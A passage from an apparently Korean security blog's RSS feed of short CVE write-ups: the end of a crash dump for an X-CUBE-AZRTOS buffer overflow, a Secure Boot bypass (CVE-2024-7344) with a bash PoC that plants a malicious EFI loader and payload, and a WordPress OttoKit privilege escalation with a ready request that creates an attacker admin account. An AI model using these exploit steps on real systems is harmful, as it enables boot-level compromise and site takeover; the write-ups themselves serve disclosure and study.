class="hljs-comment">#3  0x0802662e in webserver_request_notify_callback (server_ptr=0x20004330 &lt;HTTPServer&gt;, request_type=1, resource=0x2000433c &lt;HTTPServer+12&gt; &quot;/test.txt&quot;, packet_ptr=0x20064558 &lt;nx_byte_pool_buffer+9560&gt;) at ../NetXDuo/App/app_netxduo.c:477</span><span class="hljs-comment">#4  0x08012158 in _nx_web_http_server_get_process (server_ptr=0x20004330 &lt;HTTPServer&gt;, request_type=1, packet_ptr=0x20064558 &lt;nx_byte_pool_buffer+9560&gt;) at ../Middlewares/ST/netxduo/addons/web/nx_web_http_server.c:3778</span><span class="hljs-comment">#5  0x08011a08 in _nx_web_http_server_receive_data (tcpserver_ptr=0x20004578 &lt;HTTPServer+584&gt;, session_ptr=0x200047e4 &lt;HTTPServer+1204&gt;) at ../Middlewares/ST/netxduo/addons/web/nx_web_http_server.c:3128</span><span class="hljs-comment">#6  0x080110b2 in _nx_tcpserver_data_process (server_ptr=0x20004578 &lt;HTTPServer+584&gt;) at ../Middlewares/ST/netxduo/addons/web/nx_tcpserver.c:1048</span><span class="hljs-comment">#7  0x08011284 in _nx_tcpserver_thread_entry (tcpserver_address=536888696) at ../Middlewares/ST/netxduo/addons/web/nx_tcpserver.c:1307</span><span class="hljs-comment">#8  0x08023ff4 in _tx_thread_shell_entry () at ../Middlewares/ST/threadx/common/src/tx_thread_shell_entry.c:114</span><span class="hljs-comment">#9  &lt;signal handler called&gt;</span><span class="hljs-attribute">i</span> r<span class="hljs-attribute">r0</span>             <span class="hljs-number">0</span>x<span class="hljs-number">2</span>d                <span class="hljs-number">45</span><span class="hljs-attribute">r1</span>             <span class="hljs-number">0</span>x<span class="hljs-number">8028742</span>           <span class="hljs-number">134383426</span><span class="hljs-attribute">r2</span>             <span class="hljs-number">0</span>x<span class="hljs-number">74</span>                <span class="hljs-number">116</span><span class="hljs-attribute">r3</span>             <span class="hljs-number">0</span>x<span class="hljs-number">41414141</span>          <span class="hljs-number">1094795585</span><span class="hljs-attribute">r4</span>             <span class="hljs-number">0</span>x<span class="hljs-number">200781</span>e<span class="hljs-number">4</span>          <span class="hljs-number">537362916</span><span class="hljs-attribute">r5</span>             <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">r6</span>             <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">r7</span>             <span class="hljs-number">0</span>x<span class="hljs-number">200781</span>d<span class="hljs-number">8</span>          <span class="hljs-number">537362904</span><span class="hljs-attribute">r8</span>             <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">r9</span>             <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">r10</span>            <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">r11</span>            <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">r12</span>            <span class="hljs-number">0</span>x<span class="hljs-number">80000000</span>          -<span class="hljs-number">2147483648</span><span class="hljs-attribute">sp</span>             <span class="hljs-number">0</span>x<span class="hljs-number">2007</span>ffc<span class="hljs-number">8</span>          <span class="hljs-number">0</span>x<span class="hljs-number">2007</span>ffc<span class="hljs-number">8</span><span class="hljs-attribute">lr</span>             <span class="hljs-number">0</span>xfffffffd          -<span class="hljs-number">3</span><span class="hljs-attribute">pc</span>             <span class="hljs-number">0</span>x<span class="hljs-number">80011</span>f<span class="hljs-number">0</span>           <span class="hljs-number">0</span>x<span class="hljs-number">80011</span>f<span class="hljs-number">0</span> &lt;MemManage_Handler&gt;<span class="hljs-attribute">xpsr</span>           <span class="hljs-number">0</span>x<span class="hljs-number">21000004</span>          <span class="hljs-number">553648132</span><span class="hljs-attribute">fpscr</span>          <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">msp</span>            <span class="hljs-number">0</span>x<span class="hljs-number">2007</span>ffc<span class="hljs-number">8</span>          <span class="hljs-number">0</span>x<span class="hljs-number">2007</span>ffc<span class="hljs-number">8</span><span class="hljs-attribute">psp</span>            <span class="hljs-number">0</span>x<span class="hljs-number">20078198</span>          <span class="hljs-number">0</span>x<span class="hljs-number">20078198</span> &lt;nx_byte_pool_buffer+<span class="hljs-number">90520</span>&gt;<span class="hljs-attribute">primask</span>        <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">basepri</span>        <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">faultmask</span>      <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">control</span>        <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span></code></pre><p>&#xB530;&#xB77C;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xB9CE;&#xC740; put &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; &#xC139;&#xD130; &#xC218;&#xB97C; &#xC99D;&#xAC00;&#xC2DC;&#xCF1C; buffer overflow &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bof/">bof</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/STMicroelectronics/">STMicroelectronics</category>
      
      <category domain="https://hackyboiz.github.io/tags/X-CUBE-AZRTOS/">X-CUBE-AZRTOS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/28/ogu123/cve-2024-45064/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-7344 : Howyar Reloader UEFI 애플리케이션의 서명 검증 없는 임의 코드 실행으로 인한 Secure Boot bypass</title>
      <link>https://hackyboiz.github.io/2025/05/21/newp1ayer48/CVE-2024-7344/</link>
      <guid>https://hackyboiz.github.io/2025/05/21/newp1ayer48/CVE-2024-7344/</guid>
      <pubDate>Wed, 21 May 2025 04:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.bleepingcomputer.com/news/security/new-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.bleepingcomputer.com/news/security/new-uefi-secure-boot-flaw-exposes-systems-to-bootkits-patch-now/">https://www.bleepingcomputer.com/news/security/new-uefi-secure-boot-flaw-exposes-systems-to-bootkits-patch-now/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>SysReturn 10.2.02320240919 &#xC774;&#xD558; &#xBC84;&#xC804; &#xB4F1;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Howyar Reloader UEFI &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xBC0F; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>UEFI &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; OS &#xBD80;&#xD305; &#xC804;&#xC5D0; &#xC2E4;&#xD589;&#xB418;&#xB294; Bootloader&#xC758; &#xC720;&#xD615;&#xC73C;&#xB85C; BIOS&#xC758; &#xBC1C;&#xC804;&#xB41C; &#xD615;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>UEFI &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; Microsoft UEFI &#xC778;&#xC99D; &#xAE30;&#xAD00;(CA)&#xC5D0;&#xC11C; &#xB514;&#xC9C0;&#xD138; &#xC11C;&#xBA85;&#xC744; &#xBC1B;&#xC544; UEFI &#xBCF4;&#xC548; &#xBD80;&#xD305; &#xCD94;&#xAC00; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xB294; &#xD615;&#xD0DC;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. UEFI &#xBD80;&#xD2B8;&#xB85C;&#xB354;&#xB294; &#xCD08;&#xAE30; &#xBD80;&#xD305; &#xAD00;&#xB9AC;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xC5EC; OS &#xD30C;&#xC77C;&#xC744; &#xBCF4;&#xD638;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC5D0; &#xB85C;&#xB4DC;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>ESET &#xC5F0;&#xAD6C;&#xC6D0;&#xB4E4;&#xC740; &#xC774; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; UEFI &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC11C;&#xBA85;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBAA8;&#xB4E0; &#xD0C0;&#xC0AC; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; UEFI &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xCD08;&#xAE30; &#xBD80;&#xD305; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; PE loader&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC5D0;&#xC11C; &#xBE44;&#xB86F;&#xB418;&#xB294;&#xB370;, &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xC11C;&#xBA85;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBAA8;&#xB4E0; UEFI &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xB610;&#xD55C;, <code>reloader.efi</code>&#xAC00; &#xC548;&#xC804;&#xD55C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xC2E4;&#xD589;&#xC744; &#xC704;&#xD574; DB&#xB97C; &#xD1B5;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; UEFI&#xC758; &#xD45C;&#xC900; BootServices <code>LoadImage()</code>, <code>StartImage()</code> API&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.<br><img src="/2025/05/21/newp1ayer48/CVE-2024-7344/image1.png" alt></p><p>PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>reloader.efi</code>&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC554;&#xD638;&#xD654;&#xB41C; XOR PE &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; <code>cloak.dat</code>&#xC5D0;&#xC11C; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xC554;&#xD638;&#xB97C; &#xD574;&#xB3C5;&#xD558;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC; EFI &#xD30C;&#xD2F0;&#xC158;&#xC758; &#xC571; &#xAE30;&#xBCF8; OS Boot loader&#xB97C; &#xCDE8;&#xC57D;&#xD55C; <code>reloader.efi</code>&#xB85C; &#xBC14;&#xAFB8;&#xACE0; &#xBA85;&#xBAA9; &#xACBD;&#xB85C;&#xC5D0; &#xC545;&#xC131; <code>cloak.dat</code> &#xD30C;&#xC77C;&#xC744; &#xC2EC;&#xC5B4; &#xB193;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2DC;&#xC2A4;&#xD15C; &#xBD80;&#xD305; &#xC2DC;, &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xC758; &#xB85C;&#xB354;&#xB294; &#xBCF4;&#xC548; &#xBD80;&#xD305; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xC545;&#xC131; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xD574;&#xB3C5;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs bash"><span class="hljs-comment">##############################</span><span class="hljs-comment"># check UEFI Secure Boot status</span><span class="hljs-comment"># mokutil --sb-state</span><span class="hljs-comment"># check installed UEFI db certificates</span><span class="hljs-comment"># mokutil --db | grep &quot;Subject:&quot; | sed -E &apos;s/.*CN=//&apos;</span><span class="hljs-comment"># check dbx version</span><span class="hljs-comment"># sudo fwupdmgr get-devices 2&gt; /dev/null | grep -A 6 &quot;UEFI dbx&quot; | head -n 6</span><span class="hljs-comment">## Deploy files to exploit CVE-2024-7344 ####</span><span class="hljs-comment">##############################</span>ESP=<span class="hljs-string">&quot;/boot/efi/EFI&quot;</span>VULN_APP=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/poc/reloader.efi&quot;</span>PAYLOAD=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/poc/cloak.dat&quot;</span><span class="hljs-comment"># backup shim</span>sudo cp <span class="hljs-string">&quot;<span class="hljs-variable">$ESP</span>/ubuntu/shimx64.efi&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$ESP</span>/ubuntu/shimx64-orig.efi&quot;</span><span class="hljs-comment">#deploy vulnerable UEFI App and payload file</span>sudo cp <span class="hljs-string">&quot;<span class="hljs-variable">$VULN_APP</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$ESP</span>/ubuntu/shimx64.efi&quot;</span>sudo cp <span class="hljs-string">&quot;<span class="hljs-variable">$PAYLOAD</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$ESP</span>/boot/cloak.dat&quot;</span>sleep 3sudo reboot</code></pre></p><p>&#xC7AC;&#xBD80;&#xD305;&#xC774; &#xB418;&#xBA74; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/05/21/newp1ayer48/CVE-2024-7344/image2.png" alt></p><p>CVE-2024-7344 &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB300;&#xC0C1; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0; &#xC704; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC5C6;&#xB354;&#xB77C;&#xB3C4;, &#xCDE8;&#xC57D;&#xD55C; <code>reloader.efi</code> &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB9CC; &#xBC30;&#xD3EC;&#xD558;&#xC5EC; &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; UEFI Revocation List File &#xD328;&#xCE58;&#xB97C; &#xD1B5;&#xD574; &#xCC28;&#xB2E8;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C;, Microsoft &#xCE21;&#xC5D0;&#xC11C;&#xB294; 2025&#xB144; 1&#xC6D4; 14&#xC77C;&#xC5D0; &#xCDE8;&#xC57D;&#xD55C; UEFI &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xD3D0;&#xC9C0;&#xD558;&#xC5EC; &#xCC28;&#xB2E8;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xD328;&#xCE58;&#xB294; Windows &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xC124;&#xCE58;&#xD55C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC801;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/cve-2024-7344">https://nvd.nist.gov/vuln/detail/cve-2024-7344</a></li><li><a href="https://www.eset.com/blog/en/preparing-for-uefi-bootkits-eset-discovery-shows-the-importance-of-cyber-intelligence/">https://www.eset.com/blog/en/preparing-for-uefi-bootkits-eset-discovery-shows-the-importance-of-cyber-intelligence/</a></li><li><a href="https://x.com/pascal_gujer/status/1880025194254995636">https://x.com/pascal_gujer/status/1880025194254995636</a></li><li><a href="https://www.kb.cert.org/vuls/id/529659">https://www.kb.cert.org/vuls/id/529659</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Howyar/">Howyar</category>
      
      <category domain="https://hackyboiz.github.io/tags/UEFI-Reloader/">UEFI Reloader</category>
      
      <category domain="https://hackyboiz.github.io/tags/ACE/">ACE</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/21/newp1ayer48/CVE-2024-7344/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-27007: WordPress OttoKit 플러그인의 Privilege Escalation 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/18/pwndorei/2025-05-18/</link>
      <guid>https://hackyboiz.github.io/2025/05/18/pwndorei/2025-05-18/</guid>
      <pubDate>Sun, 18 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://patchstack.com/articles/additional-critical-ottok</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://patchstack.com/articles/additional-critical-ottokit-formerly-suretriggers-vulnerability-patched">https://patchstack.com/articles/additional-critical-ottokit-formerly-suretriggers-vulnerability-patched</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OttoKit (&#xAD6C; SureTriggers) &#x2264; v1.0.82</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress&#xC758; &#xB370;&#xC774;&#xD130; &#xC790;&#xB3D9;&#xD654;&#x2027;&#xC5F0;&#xB3D9; &#xD50C;&#xB7EC;&#xADF8;&#xC778; OttoKit&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD574; WordPress &#xAD00;&#xB9AC;&#xC790; &#xACC4;&#xC815;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>create_wp_connection</code> &#xD568;&#xC218;&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_wp_connection</span>(<span class="hljs-params"> $request </span>) </span>{$user_agent = $request-&gt;get_header( <span class="hljs-string">&apos;user-agent&apos;</span> );<span class="hljs-keyword">if</span> ( <span class="hljs-string">&apos;OttoKit&apos;</span> !== $user_agent &amp;&amp; <span class="hljs-string">&apos;SureTriggers&apos;</span> !== $user_agent ) {<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> WP_REST_Response([<span class="hljs-string">&apos;success&apos;</span> =&gt; <span class="hljs-literal">false</span>,<span class="hljs-string">&apos;data&apos;</span>    =&gt; <span class="hljs-string">&apos;Unauthorized&apos;</span>,],<span class="hljs-number">403</span>);}$params = $request-&gt;get_json_params();$username = <span class="hljs-keyword">isset</span>( $params[<span class="hljs-string">&apos;wp-username&apos;</span>] ) ? sanitize_text_field( $params[<span class="hljs-string">&apos;wp-username&apos;</span>] ) : <span class="hljs-string">&apos;&apos;</span>;$password = <span class="hljs-keyword">isset</span>( $params[<span class="hljs-string">&apos;wp-password&apos;</span>] ) ? $params[<span class="hljs-string">&apos;wp-password&apos;</span>] : <span class="hljs-string">&apos;&apos;</span>;<span class="hljs-keyword">if</span> ( <span class="hljs-keyword">empty</span>( $username ) || <span class="hljs-keyword">empty</span>( $password ) ) {<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> WP_REST_Response([<span class="hljs-string">&apos;success&apos;</span> =&gt; <span class="hljs-literal">false</span>,<span class="hljs-string">&apos;data&apos;</span>    =&gt; <span class="hljs-string">&apos;Username and password are required.&apos;</span>,],<span class="hljs-number">400</span>);}$user = wp_authenticate_application_password( <span class="hljs-literal">null</span>, $username, $password );<span class="hljs-comment">//[1]</span><span class="hljs-keyword">if</span> ( is_wp_error( $user ) ) {<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> WP_REST_Response([<span class="hljs-string">&apos;success&apos;</span> =&gt; <span class="hljs-literal">false</span>,<span class="hljs-string">&apos;data&apos;</span>    =&gt; <span class="hljs-string">&apos;Invalid username or password.&apos;</span>,],<span class="hljs-number">403</span>);}$connection_status = $request-&gt;get_param( <span class="hljs-string">&apos;connection-status&apos;</span> );$access_key        = $request-&gt;get_param( <span class="hljs-string">&apos;sure-triggers-access-key&apos;</span> );$connected_email   = $request-&gt;get_param( <span class="hljs-string">&apos;connected_email&apos;</span> );<span class="hljs-keyword">if</span> ( <span class="hljs-literal">false</span> === $connection_status ) {$access_key = <span class="hljs-string">&apos;connection-denied&apos;</span>;}$connected_email_id = <span class="hljs-keyword">isset</span>( $connected_email ) ? sanitize_email( wp_unslash( $connected_email ) ) : <span class="hljs-string">&apos;&apos;</span>;<span class="hljs-keyword">if</span> ( <span class="hljs-keyword">isset</span>( $access_key ) ) {SaasApiToken::save( $access_key );}OptionController::set_option( <span class="hljs-string">&apos;connected_email_key&apos;</span>, $connected_email_id );<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> WP_REST_Response([<span class="hljs-string">&apos;success&apos;</span> =&gt; <span class="hljs-literal">true</span>,<span class="hljs-string">&apos;data&apos;</span>    =&gt; <span class="hljs-string">&apos;Connected successfully.&apos;</span>,],<span class="hljs-number">200</span>);}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>wp_authenticate_application_password</code> &#xD568;&#xC218;(<code>[1]</code>)&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xACE0; <code>is_wp_error</code>&#xB85C; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xBC18;&#xD658;&#xAC12; <code>$user</code>&#xB97C; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D;&#xC774; &#xC131;&#xACF5;&#xC801;&#xC774;&#xC5C8;&#xB294;&#xC9C0; &#xC2E4;&#xD328;(&#xC5D0;&#xB7EC;)&#xC778;&#xC9C0; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC544;&#xB798;&#xC758; &#xD328;&#xCE58;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; <code>is_wp_error</code>&#xAC00; &#xC544;&#xB2C8;&#xB77C; <code>$user</code>&#xAC00; <code>WP_User</code>&#xC758; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D; &#xC131;&#xACF5; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>is_wp_error</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB358; &#xAE30;&#xC874; &#xBC29;&#xC2DD;&#xC5D0; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC5C8;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/18/pwndorei/2025-05-18/image.png" alt="image.png"></p><p>&#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xAD00;&#xB9AC;&#xC790;&#xC758; username&#xB9CC; &#xC544;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC784;&#xC758;&#xC758; password&#xC640; access key&#xB85C; &#xC5F0;&#xACB0;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; <code>/wp-json/sure-triggers/v1/automation/action</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xC11C; &#xC0C8;&#xB85C;&#xC6B4; &#xAD00;&#xB9AC;&#xC790; &#xACC4;&#xC815;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs groovy">POST <span class="hljs-regexp">/wp-json/</span>sure-triggers<span class="hljs-regexp">/v1/</span>automation<span class="hljs-regexp">/action HTTP/</span><span class="hljs-number">1.1</span><span class="hljs-attr">Host:</span> victim.blogContent-<span class="hljs-attr">Type:</span> application/x-www-form-urlencodedSt-<span class="hljs-attr">Authorization:</span>selected_options[user_name]=pwned_admin&amp;selected_options[user_email]=evil<span class="hljs-meta">@hacker</span>.tld&amp;selected_options[password]=S3cureP<span class="hljs-meta">@ss</span>!&amp;selected_options[role]=administrator&amp;aintegration=WordPress&amp;type_event=create_user_if_not_exists</code></pre><p>&#xB610;&#xD55C; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC774; &#xC124;&#xCE58;&#xB41C; &#xC9C1;&#xD6C4;&#xC758; &#xC0C1;&#xD0DC;&#xCC98;&#xB7FC; secret_key&#xAC00; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC9C0; 